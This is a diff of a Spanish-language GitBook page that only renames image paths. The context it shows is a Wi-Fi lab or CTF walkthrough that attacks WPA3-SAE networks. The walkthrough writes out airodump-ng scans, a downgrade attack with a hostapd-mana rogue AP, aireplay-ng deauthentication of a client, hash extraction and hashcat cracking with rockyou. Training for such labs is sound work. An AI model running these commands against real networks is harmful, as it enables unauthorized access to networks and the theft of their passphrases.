@@ -13,7 +13,7 @@ En este capítulo vamos a realizar los siguientes retos:
 
 Primero escaneamos todos los canales como siempre hasta encontrar "wifi-management"
 
-<figure><img src="../../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>
 
 Red SAE, WPA3, canal 11, ahora solo escaneamos esas canal y BSSID
 
@@ -21,7 +21,7 @@ Red SAE, WPA3, canal 11, ahora solo escaneamos esas canal y BSSID
 airodump-ng wlan0 --manufacturer --band bag -c 11 --bssid F0:9F:C2:11:0A:24
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (533).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="background-color:yellow;">Las redes SAE no tiene handshake que se puedan atacar, se puede atacar a los clientes (si hay alguna mal configurado) o un ataque de fuerza bruta online</mark>
 
@@ -37,7 +37,7 @@ Para este ataque necesitamos la `frecuencia del AP,` no el canal. Para esto, con
 iwlist wlan0 frequency | grep 'Channel 11 :'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (534).png" alt=""><figcaption></figcaption></figure>
 
 > Channel 11 : 2.462 GHz
 
@@ -47,7 +47,7 @@ iwlist wlan0 frequency | grep 'Channel 11 :'
 
 > `--interface` : Hay que poner una interfaz de red que no este en modo monitor
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (535).png" alt=""><figcaption></figcaption></figure>
 
 Ahora, sabiendo la credencial creamos el fichero de conexión con `wpasupplican`t -->
 
@@ -68,7 +68,7 @@ wpa_supplicant -i wlan2 -c sae.conf
 sudo dhclient wlan2 -v
 ```
 
-<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -82,7 +82,7 @@ Escaneamos toda las redes hasta encontrar "wifi-IT" y luego hacemos un scaneo es
 airodump-ng wlan0 --manufacturer --band bag -c 11 --bssid F0:9F:C2:1A:CA:25 -w sae2
 ```
 
-<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>
 
 Vemos que tiene un cliente, asi que podemos intentar hacerle un ataque de downgrade
 
@@ -90,7 +90,7 @@ Vemos que tiene un cliente, asi que podemos intentar hacerle un ataque de downgr
 
 Para esto abrimos en fichero de la captura actual, pero abrimos el `.csv.` Asi podemos ver un poco mas de informacion de la que nos da `airodump-ng`
 
-<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (538).png" alt=""><figcaption></figcaption></figure>
 
 Aqui vemos que este AP, soporta a WPA3 y WPA2, y a nivel de autentificación SAE y PSK
 
@@ -108,7 +108,7 @@ python3 /root/tools/wifi_db/wifi_db.py -d WifiSAE.db /home/user/wifi/SAE/
 sqlitebrowser WifiSAE.db
 ```
 
-<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (539).png" alt=""><figcaption></figcaption></figure>
 
 Al ver que no tiene habilitado ni el mfpc y mfpr, podemo hacerle un ataque de desautentficcacion al cliente, para forzarle que se conecte a un AP nuestro
 
@@ -138,7 +138,7 @@ Ahora levantamos levantamos con `hostap-mana` -->
 hostapd-mana hostapd-sae.conf
 ```
 
-<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (540).png" alt=""><figcaption></figcaption></figure>
 
 Ya tenemos el AP falso con WPA2 corriendo.
 
@@ -157,7 +157,7 @@ aireplay-ng wlan0 -0 0 -a F0:9F:C2:1A:CA:25 -c 10:F9:6F:AC:53:52
 
 Al ejecutarlo, vemos como se nos conecta un cliente a nuestro AP falso -->
 
-<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (541).png" alt=""><figcaption></figcaption></figure>
 
 Ahora vamos al fichero `hostapd-it.hccapx` donde se guardan y saquemos solo el hash
 
@@ -165,7 +165,7 @@ Ahora vamos al fichero `hostapd-it.hccapx` donde se guardan y saquemos solo el h
 cat hostapd-it.hccapx | head -n 1 | awk '{print $3}' >> hostapd-it.22000
 ```
 
-<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (542).png" alt=""><figcaption></figcaption></figure>
 
 Y por ultimo rompemos los hashes con `hascat` -->
 
@@ -173,7 +173,7 @@ Y por ultimo rompemos los hashes con `hascat` -->
 hashcat -a 0 -m 22000 hostapd-it.22000 ~/rockyou-top100000.txt --force
 ```
 
-<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (543).png" alt=""><figcaption></figcaption></figure>
 
 Ahora como siempre hacemos la conexion con `wpa_supplicant` -->
 
@@ -199,6 +199,6 @@ wpa_supplicant -i wlan2 -c sae2.conf
 dhclient wlan2 -v
 ```
 
-<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (544).png" alt=""><figcaption></figcaption></figure>
 
 Ahora accdemos a la `192.168.15.1` para coger la flag
